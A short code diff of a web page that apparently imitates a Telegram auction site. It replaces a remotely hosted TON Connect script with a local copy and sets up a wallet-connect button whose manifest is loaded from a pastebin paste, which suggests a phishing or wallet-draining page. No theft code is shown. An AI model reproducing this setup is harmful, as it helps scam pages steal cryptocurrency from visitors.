@@ -234,7 +234,7 @@
     <script src="/js/main-aj7cbb.js"></script>
     <script src="/js/jquery-ex98f1.js"></script>
 <script src="/js/qr-code-stylingc4ca.js"></script>
-<script src="https://bot-connect.onrender.com/js/tonconnect-ui.min1679.js"></script>
+<script src="/js/tonconnect-ui.min1679.js"></script>
 <script src="/js/auctionf033.js"></script>
 <script src="/js/tgstickerc16a.js"></script>
 <script src="/telegram.org/js/telegram-widgetb6d7.js"></script>
@@ -475,11 +475,9 @@ if (number) {
         numberBlock.outerHTML = telegramBlock;
     }
 }
-
-  document.addEventListener('DOMContentLoaded', async () => {
-    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: 'https://pastebin.com/raw/Yk2cstyP'
-    });
+  const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+      manifestUrl: 'https://pastebin.com/raw/Yk2cstyP'
+  });
 
   document.getElementById('ton-connect-button').addEventListener('click', async () => {
     try {
